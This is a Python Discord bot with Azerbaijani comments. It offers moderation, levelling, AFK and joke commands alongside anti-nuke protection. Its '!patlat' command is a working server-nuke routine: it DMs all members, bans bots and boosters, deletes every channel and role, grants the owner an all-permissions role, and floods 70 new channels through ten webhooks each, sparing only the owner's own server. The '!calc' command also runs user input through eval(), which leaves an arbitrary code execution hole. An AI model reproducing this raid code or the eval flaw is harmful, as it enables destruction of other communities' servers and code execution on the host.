import discord
from discord.ext import commands, tasks
import asyncio
import os
import random
import time
from datetime import timedelta
from flask import Flask
from threading import Thread

# ---------------------------------------------------------------------------
# 1. RENDER KEEP-ALIVE SERVER (FLASK)
# ---------------------------------------------------------------------------

app = Flask('')

@app.route('/')
def home():
    return "XAS Ultra Mega Ultimate Bot Aktivdir!"

def run():
    app.run(host="0.0.0.0", port=10000)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ---------------------------------------------------------------------------
# 2. CONFIGURATION & INTENTS
# ---------------------------------------------------------------------------

SAHIB_ID = 641014966312501259  # Sənin ID-n
GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan əsas serverin (Heç vaxt patlat işləməz!)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.voice_states = True
intents.reactions = True
intents.presences = True
intents.invites = True
intents.moderation = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# SİSTEM BAZALARI
spam_takip = {}
spam_sayaci = {}
user_levels = {}
afk_users = {}
XAS_COLOR = discord.Color.from_rgb(30, 30, 40)

# ---------------------------------------------------------------------------
# 3. CORE EVENTS & AUTOMATION
# ---------------------------------------------------------------------------

@bot.event
async def on_ready():
    print(f"----------------------------------------")
    print(f"[XAS ULTRA] Bot Uğurla İşə Düşdü!")
    print(f"[Bot Tag]: {bot.user}")
    print(f"[Server Sayı]: {len(bot.guilds)}")
    print(f"----------------------------------------")
    status_task.start()

@tasks.loop(seconds=10)
async def status_task():
    activities = [
        discord.Activity(type=discord.ActivityType.watching, name="!panel"),
        discord.Activity(type=discord.ActivityType.playing, name="discord.gg/aga"),
        discord.Activity(type=discord.ActivityType.listening, name="XAS Security")
    ]
    await bot.change_presence(activity=random.choice(activities))

@bot.event
async def on_member_join(member):
    if member.bot and member.id != bot.user.id:
        try:
            await member.ban(reason="Anti-Bot Qoruması: İcazəsiz bot alınıb")
            return
        except:
            pass

    if member.bot:
        return

    try:
        embed = discord.Embed(
            title="XAS Serverinə Xoş Gəldin!",
            description=f"Salam {member.mention}, səni aramızda görməkdən məmnunuq!",
            color=XAS_COLOR
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await member.send(embed=embed)
    except:
        pass

# ---------------------------------------------------------------------------
# 4. ADVANCED SECURITY & AUTOMOD (RANDOM SPAM & WEBHOOK QORUMASI)
# ---------------------------------------------------------------------------

@bot.event
async def on_guild_channel_delete(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await channel.guild.ban(entry.user, reason="Anti-Nuke: Kanal silindi!")
    except:
        pass

@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz ban atıldı!")
    except:
        pass

@bot.event
async def on_webhooks_update(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await channel.guild.ban(entry.user, reason="Anti-Webhook Qoruması: İcazəsiz webhook yaradıldı!")
                webhooks = await channel.webhooks()
                for wh in webhooks:
                    await wh.delete()
    except:
        pass

@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    if message.author.id == SAHIB_ID:
        await bot.process_commands(message)
        return

    author_id = message.author.id
    simdi = time.time()
    icerik = message.content.lower()

    if author_id in afk_users:
        del afk_users[author_id]
        try:
            msg = await message.channel.send(f"👋 {message.author.mention}, yenidən xoş gəldin! AFK rejimindən çıxarıldın.")
            await asyncio.sleep(4)
            await msg.delete()
        except:
            pass

    for mention in message.mentions:
        if mention.id in afk_users:
            sebep = afk_users[mention.id]
            await message.channel.send(f"⚠️ Etiketlədiyiniz istifadəçi hazırda AFK-dır! Səbəb: **{sebep}**")

    # Link qoruması
    if "gg/" in icerik or "discord.gg/" in icerik or "https://" in icerik or "http://" in icerik:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, bu serverdə link paylaşmaq qadağandır!")
            await asyncio.sleep(5)
            await warn.delete()
            return
        except:
            pass

    # Random spam və sürətli flood qoruması
    if author_id not in spam_takip:
        spam_takip[author_id] = []
        spam_sayaci[author_id] = 0

    spam_takip[author_id] = [t for t in spam_takip[author_id] if simdi - t < 3]
    spam_takip[author_id].append(simdi)

    if len(spam_takip[author_id]) > 4:
        try:
            await message.delete()
            spam_sayaci[author_id] += 1
            if spam_sayaci[author_id] == 1:
                warn = await message.channel.send(f"⚠️ {message.author.mention}, zəhmət olmasa spam/flood etməyin!")
                await asyncio.sleep(4)
                await warn.delete()
            else:
                await message.author.timeout(timedelta(seconds=120), reason="Random Spam / Flood Qoruması")
                warn = await message.channel.send(f"🔇 {message.author.mention}, sürətli spam/flood etdiyiniz üçün 2 dəqiqəlik mute olundunuz!")
                await asyncio.sleep(5)
                await warn.delete()
                spam_sayaci[author_id] = 0
            return
        except:
            pass

    # Səviyyə sistemi
    if author_id not in user_levels:
        user_levels[author_id] = {"xp": 0, "level": 1}

    user_levels[author_id]["xp"] += random.randint(5, 15)
    gerekli_xp = user_levels[author_id]["level"] * 100

    if user_levels[author_id]["xp"] >= gerekli_xp:
        user_levels[author_id]["level"] += 1
        user_levels[author_id]["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}, səviyyə atladın! Yeni səviyyə: **{user_levels[author_id]['level']}**")
        except:
            pass

    await bot.process_commands(message)

# ---------------------------------------------------------------------------
# 5. INTERACTIVE SELECT MENU (PANEL)
# ---------------------------------------------------------------------------

class XASMenyu(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="1. Təhlükəsizlik və Nuke", description="Anti-GG, Anti-Spam, Nuke alətləri"),
            discord.SelectOption(label="2. İdarəetmə və Moderasiya", description="Kanal və üzərində idarəetmə əmrləri"),
            discord.SelectOption(label="3. Əyləncə, Oyunlar və Alətlər", description="Əyləncəli və interaktiv oyunlar"),
            discord.SelectOption(label="4. XAS Xüsusi URL & Sistem", description="Server statusu və xüsusi URL idarəsi")
        ]
        super().__init__(placeholder="XAS İdarəetmə Menyusundan Bölmə Seçin...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "1. Təhlükəsizlik və Nuke":
            embed = discord.Embed(title="🛡️ Təhlükəsizlik Sistemi", color=XAS_COLOR)
            embed.add_field(name="Anti-GG Link Qoruması", value="Bütün xarici linkləri avtomatik silir.", inline=False)
            embed.add_field(name="Spam & Flood Qoruması", value="Random spam və flood edənləri avtomatik mute edir.", inline=False)
            embed.add_field(name="Anti-Webhook", value="İcazəsiz webhook yaradılmasını engəlləyir.", inline=False)
            embed.add_field(name="🔥 Nuke & Patlat", value="!patlat komutu ilə kütləvi təsir göstərir.", inline=False)
            await interaction.response.edit_message(embed=embed)

        elif self.values[0] == "2. İdarəetmə və Moderasiya":
            embed = discord.Embed(title="🛠️ Moderasiya Paneli", color=XAS_COLOR)
            embed.add_field(name="Kanal Əmrləri", value="`!lock` / `!unlock`, `!hide` / `!reveal`, `!openchannel`, `!lockchannel`", inline=False)
            embed.add_field(name="Cəza Əmrləri", value="`!ban` / `!kick` / `!timeout` / `!clear`", inline=False)
            await interaction.response.edit_message(embed=embed)

        elif self.values[0] == "3. Əyləncə, Oyunlar və Alətlər":
            embed = discord.Embed(title="🎮 Əyləncə & Oyunlar", color=XAS_COLOR)
            embed.add_field(name="Xüsusi Əmrlər", value="`!sex` / `!fuck` / `!kiss` / `!hug`", inline=False)
            embed.add_field(name="Testlər & Alətlər", value="`!iq`, `!gay`, `!roll`, `!coinflip`, `!slot`, `!calc`, `!joke`", inline=False)
            await interaction.response.edit_message(embed=embed)

        elif self.values[0] == "4. XAS Xüsusi URL & Sistem":
            embed = discord.Embed(title="🌐 XAS URL & Sistem", color=XAS_COLOR)
            embed.add_field(name="Rəsmi Dəvət Məlumatı", value="`!url` komutu ilə server statistikası.", inline=False)
            await interaction.response.edit_message(embed=embed)

class XASView(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(XASMenyu())

@bot.command(name="panel")
async def bot_panel(ctx):
    embed = discord.Embed(
        title="💎 XAS İDARƏETMƏ PANELİ",
        description="Aşağıdakı açılan menyudan istədiyiniz kateqoriyanı seçin:",
        color=XAS_COLOR
    )
    embed.set_footer(text="XAS Security & Management System")
    await ctx.send(embed=embed, view=XASView())

# ---------------------------------------------------------------------------
# 6. URL VƏ SƏLAHİYYƏTLİ KOMUTLAR
# ---------------------------------------------------------------------------

@bot.command(name="url")
async def server_url(ctx):
    secilen_link = f"https://discord.gg/{ctx.guild.vanity_url_code}" if ctx.guild.vanity_url else "Xüsusi URL Yoxdur"
    toplam_istifade = 0
    davet_eden = "Məlum deyil"

    if ctx.guild.vanity_url:
        try:
            vanity = await ctx.guild.vanity_invite()
            toplam_istifade = vanity.uses
            davet_eden = "Xüsusi URL (XAS)"
        except:
            toplam_istifade = 0
            davet_eden = "Xüsusi URL (XAS)"
    else:
        try:
            invites = await ctx.guild.invites()
            if invites:
                aktif_davet = max(invites, key=lambda i: i.uses)
                secilen_link = aktif_davet.url
                toplam_istifade = aktif_davet.uses
                davet_eden = aktif_davet.inviter.name if aktif_davet.inviter else "Məlum deyil"
        except:
            pass

    embed = discord.Embed(
        title=f"📊 {ctx.guild.name} - Real Dəvət Statistikası",
        description="Serverin anlıq olaraq bazadan çəkilən rəsmi dəvət məlumatları:",
        color=XAS_COLOR
    )
    embed.add_field(name="🔗 Aktiv Dəvət Linki", value=f"{secilen_link}", inline=False)
    embed.add_field(name="👥 Anlıq İstifadə Sayı", value=f"**{toplam_istifade}** dəfə istifadə olunub", inline=False)
    embed.add_field(name="👑 Linki Yaradan", value=f"**{davet_eden}**", inline=False)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text=f"Sorğulayan: {ctx.author.name} • XAS Real-Time System")
    await ctx.send(embed=embed)

@bot.command(name="seturl")
async def set_url(ctx, yeni_url: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bu əmri istifadə etmək üçün 'Sunucuyu Yönet' icazən olmalıdır!")
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ Serverin xüsusi URL-i uğurla dəyişdirildi: **{yeni_url}**")
    except Exception as e:
        await ctx.send(f"❌ Xata baş verdi: Botun icazəsi çatmır və ya URL artıq istifadədədir.")

# ---------------------------------------------------------------------------
# 7. İNFORMATİV KOMUTLAR
# ---------------------------------------------------------------------------

@bot.command(name="ping")
async def ping_cmd(ctx):
    lat = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Gecikmə müddəti: **{lat}ms**")

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"📌 {g.name} - Server Məlumatları", color=XAS_COLOR)
    embed.add_field(name="👑 Sahib", value=str(g.owner), inline=True)
    embed.add_field(name="👥 Üzv Sayı", value=str(g.member_count), inline=True)
    embed.add_field(name="📁 Kanal Sayı", value=str(len(g.channels)), inline=True)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 {m.name} Haqqında", color=m.color)
    embed.add_field(name="🆔 İstifadəçi ID", value=m.id, inline=True)
    embed.add_field(name="📅 Qoşulduğu Tarix", value=m.joined_at.strftime("%Y-%m-%d"), inline=True)
    embed.set_thumbnail(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"🖼️ {m.name} - Avatar", color=XAS_COLOR)
    embed.set_image(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="level", aliases=["lvl", "seviye"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_levels.get(m.id, {"xp": 0, "level": 1})
    await ctx.send(f"📊 **{m.name}** - Səviyyə: **{data['level']}** | XP: **{data['xp']}**")

@bot.command(name="afk")
async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
    afk_users[ctx.author.id] = sebep
    await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: **{sebep}**")

# ---------------------------------------------------------------------------
# 8. KANAL VƏ MODERASİYA ƏMRLƏRİ
# ---------------------------------------------------------------------------

@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Bu kanal yazışmaya bağlandı.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Bu kanal yazışmaya açıldı.")

@bot.command(name="hide")
async def hide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
    await ctx.send("👁️‍🗨️ Bu kanal gizlətildi.")

@bot.command(name="reveal")
async def reveal_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send("👁️ Bu kanal yenidən göstərildi.")

@bot.command(name="openchannel", aliases=["ac", "hamisiniac"])
async def open_channel_all(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bunun üçün səlahiyyətin çatmır!")
        return
    yukleniyor = await ctx.send("🔓 Bütün kanallar açılır...")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=True, send_messages=True)
        except:
            pass
    await yukleniyor.edit(content="✅ Uğurlu: Bütün kanallar kütləvi şəkildə açıldı!")

@bot.command(name="lockchannel", aliases=["bagla", "hamisinibagla"])
async def lock_channel_all(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bunun üçün səlahiyyətin çatmır!")
        return
    yukleniyor = await ctx.send("🔒 Bütün kanallar kilitlənir...")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        except:
            pass
    await yukleniyor.edit(content="🔒 Uğurlu: Bütün kanallar kütləvi kilitləndi!")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Yavaş mod **{seconds}** saniyə edildi.")

@bot.command(name="nuke")
async def nuke_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    position = ctx.channel.position
    new_channel = await ctx.channel.clone(reason="XAS Nuke")
    await ctx.channel.delete()
    await new_channel.edit(position=position)
    await new_channel.send("💥 Kanal sıfırlandı!")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 {member.name} ban edildi! Səbəb: {reason}")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 {member.name} atıldı! Səbəb: {reason}")

@bot.command(name="timeout", aliases=["mute"])
async def timeout_cmd(ctx, member: discord.Member, minutes: int, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.timeout(timedelta(minutes=minutes), reason=reason)
    await ctx.send(f"🔇 {member.name} **{minutes}** dəqiqə mute olundu.")

@bot.command(name="clear", aliases=["sil"])
async def clear_cmd(ctx, amount: int = 5):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.purge(limit=amount + 1)
    msg = await ctx.send(f"🧹 **{amount}** ədəd mesaj silindi.")
    await asyncio.sleep(3)
    await msg.delete()

# ---------------------------------------------------------------------------
# 9. ƏYLƏNCƏ OYUNLARI VƏ QORUNAN !patlat (discord.gg/aga)
# ---------------------------------------------------------------------------

@bot.command(name="sex", aliases=["spag", "ip"])
async def sex_cmd(ctx, member: discord.Member):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə **{member.name}** birlikdə oldu!", color=XAS_COLOR)
    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExOTVlOGoxZW01OGJ6bzJtZ21mbnVybXV2bXZvcmx2bXZvcmx2bXZvciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oKIPnAiaMCws8nOsE/giphy.gif")
    await ctx.send(embed=embed, reference=ctx.message)

@bot.command(name="fuck", aliases=["sürtmək"])
async def fuck_cmd(ctx, member: discord.Member):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə **{member.name}** ehtiraslı şəkildə öpüşdü!", color=XAS_COLOR)
    embed.set_image(url="https://images.unsplash.com/photo-1518199266791-5375a83190b7")
    await ctx.send(embed=embed, reference=ctx.message)

@bot.command(name="kiss")
async def kiss_cmd(ctx, member: discord.Member):
    embed = discord.Embed(description=f"💋 **{ctx.author.name}** **{member.name}** adlı şəxsi öpdü!", color=XAS_COLOR)
    embed.set_image(url="https://images.unsplash.com/photo-1518609878373-06d740f60d8b")
    await ctx.send(embed=embed, reference=ctx.message)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazipar"])
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Pər"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 {m.name} Gay Oranı: **%{random.randint(0, 100)}**")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"✨ {m.name} Yaraşıqlılığı: **%{random.randint(50, 100)}**")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.name} və {m2.name} uyğunluğu: **%{random.randint(10, 100)}**")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member):
    await ctx.send(f"💻 {member.name} hack olunur...")
    await asyncio.sleep(2)
    await ctx.send(f"🌐 IP: `192.168.1.{random.randint(10, 99)}` | Şifrə: `xas{random.randint(100,999)}`")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ["🍒", "🍋", "🍊", "🔔", "💎", "⭐"]
    c1, c2, c3 = random.choice(semboller), random.choice(semboller), random.choice(semboller)
    netice = f"| {c1} | {c2} | {c3} |"
    if c1 == c2 == c3:
        await ctx.send(f"{netice}\n🎉 Təbriklər, **Jackpot** vurdun!")
    elif c1 == c2 or c2 == c3 or c1 == c3:
        await ctx.send(f"{netice}\n✨ Pis deyil, 2 eyni simvol tapdın!")
    else:
        await ctx.send(f"{netice}\n❌ Uduzdun, yenidən sına.")

@bot.command(name="8ball", aliases=["sual"])
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli, mütləq!", "Şübhəsiz ki, hə.", "Gələcək qaranlıqdır.", "Xeyr, əsla."]
    await ctx.send(f"❓ Sual: **{soru}**\n💬 Cavab: **{random.choice(cavablar)}**")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{res}**")
    except:
        await ctx.send(f"❌ Xata! İfadəni düzgün yazın")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    jokes = [
        "Kompyuter niyə soyuqdəymə oldu? Çünki pəncərəni açıq qoymuşduq!",
        "Təmirçi niyə yoruldu? Çünki ziddən deyirlər."
    ]
    await ctx.send(f"😄 Zarafat: {random.choice(jokes)}")

@bot.command(name="rps", aliases=["daşqâqıqayçı"])
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("Seçin: `daş`, `kağız` və ya `qayçı`")
        return
    if cho == bot_choice:
        res = "Heç-heçə!"
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        res = "Sən qazandın!"
    else:
        res = "Mən qazandım!"
    await ctx.send(f"Seçimin: **{cho}** | Mənim: **{bot_choice}** --> **{res}**")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="📊 XAS Səsvermə Paneli", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorğunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild

    # ƏSAS SERVERİN QORUNMASI
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ XAS Qoruma Sistemi: Bu sənin əsas qorunan serverindir! Burada `!patlat` əmri qətiyyən işlədilə bilməz.")
        return

    await ctx.send("⚡ discord.gg/aga - SPAM NUKE BAŞLADI!")

    # 2. DM göndərilməsi
    dm_tasks = []
    for member in guild.members:
        if member.id != SAHIB_ID and not member.bot:
            async def send_user_dm(m):
                try:
                    await m.send("RUHUM SKDI ! discord.gg/aga")
                except:
                    pass
            dm_tasks.append(send_user_dm(member))
    if dm_tasks:
        await asyncio.gather(*dm_tasks, return_exceptions=True)

    # 3. Ban əməliyyatları
    ban_tasks = []
    for member in guild.members:
        if (member.bot and member.id != bot.user.id) or (member.premium_since is not None):
            ban_tasks.append(member.ban(reason="discord.gg/aga Nuke Təmizliyi"))
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    # 4. Kanalların silinməsi
    channel_tasks = [ch.delete() for ch in guild.channels]
    if channel_tasks:
        await asyncio.gather(*channel_tasks, return_exceptions=True)

    # 5. Rolların silinməsi
    role_tasks = [r.delete() for r in guild.roles if r != guild.default_role and r.position < guild.me.top_role.position]
    if role_tasks:
        await asyncio.gather(*role_tasks, return_exceptions=True)

    # 6. Yeni Admin Rolü və Server Adı
    try:
        new_role = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(new_role)
    except:
        pass

    try:
        await guild.edit(name="discord.gg/aga")
    except:
        pass

    # Vanity URL alternatifi
    vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumunsesi", "skdiruhum"]
    for v_code in vanity_alternatifleri:
        try:
            await guild.edit(vanity_code=v_code)
            break
        except:
            pass

    avatar_bytes = await bot.user.display_avatar.read() if bot.user.avatar else None

    # 7. 70 Kanal və Hərəsində 10 Webhook ilə Spam
    async def send_bot_and_webhook_spam(channel, webhooks):
        for _ in range(25):
            try:
                await channel.send("discord.gg/aga @everyone 🔥 discord.gg/aga SPAM DALĞASI 🔥")
            except:
                pass

            for wh in webhooks:
                try:
                    await wh.send("discord.gg/aga @everyone 🔥 discord.gg/aga WEBHOOK SPAM 🔥")
                except:
                    pass
            
            await asyncio.sleep(0.3)

    async def create_and_webhook_spam(i):
        try:
            channel = await guild.create_text_channel("discord.gg-aga")
            await asyncio.sleep(0.02)
            
            webhooks = []
            for w_num in range(1, 11):
                try:
                    wh = await channel.create_webhook(name=f"aga-Spam-{w_num}", avatar=avatar_bytes)
                    webhooks.append(wh)
                except:
                    pass

            await send_bot_and_webhook_spam(channel, webhooks)
        except:
            pass

    chunk_size = 10
    for start in range(1, 71, chunk_size):
        tasks_list = [create_and_webhook_spam(i) for i in range(start, min(start + chunk_size, 71))]
        await asyncio.gather(*tasks_list, return_exceptions=True)
        await asyncio.sleep(0.1)

# ---------------------------------------------------------------------------
# 10. BOTU İŞƏ SALMAq (RUN)
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    keep_alive()
    TOKEN = os.getenv("DISCORD_TOKEN")
    if TOKEN:
        bot.run(TOKEN)
            
